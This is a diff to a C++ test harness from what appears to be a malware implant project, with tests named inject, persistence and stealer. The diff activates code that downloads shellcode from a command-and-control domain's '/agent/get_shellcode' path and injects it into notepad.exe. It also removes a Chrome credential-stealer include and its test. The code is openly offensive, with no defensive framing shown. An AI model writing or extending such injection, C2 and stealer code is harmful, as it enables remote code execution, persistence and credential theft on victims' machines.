@@ -2,7 +2,6 @@
 #include "aes_gcm.h"
 #include "http.h"
 #include "inject.h"
-#include "../stealer/chrome.cpp"
 #include <iostream>
 #include <fstream>
 
@@ -101,12 +100,12 @@ void test_http() {
 void test_inject()
 {
     
-    // std::string exePath = "C:\\WINDOWS\\System32\\cmd.exe";
-    // std::string response = httpRequest(L"GET", c2Domain, port, L"/agent/get_shellcode", "");
-    // std::cout << response.size() << std::endl;
-    // char* shellcode = &*response.begin();
-    // printHexArray((BYTE*) shellcode, 10);
-    // std::cout << inject(exePath, shellcode, response.size()) << std::endl;
+    std::string exePath = "C:\\WINDOWS\\System32\\notepad.exe";
+    std::string response = httpGet(c2Domain, port, L"/agent/get_shellcode", FALSE);
+    std::cout << response.size() << std::endl;
+    char* shellcode = &*response.begin();
+    printHexArray((BYTE*) shellcode, 10);
+    std::cout << inject(exePath, shellcode, response.size()) << std::endl;
 }
 
 void test_persistence()
@@ -149,9 +148,6 @@ void test_persistence()
     RegCloseKey(hKey);
 }
 
-void test_stealer() {
-    stealer();
-}
 
 int main(int argc, char* argv[])
 {   
@@ -172,8 +168,6 @@ int main(int argc, char* argv[])
         test_inject();
     } else if (test_name == "persistence") {
         test_persistence();
-    } else if (test_name == "stealer") {
-        test_stealer();
     } else {
         std::cout << "test name invalid" << std::endl;
     }
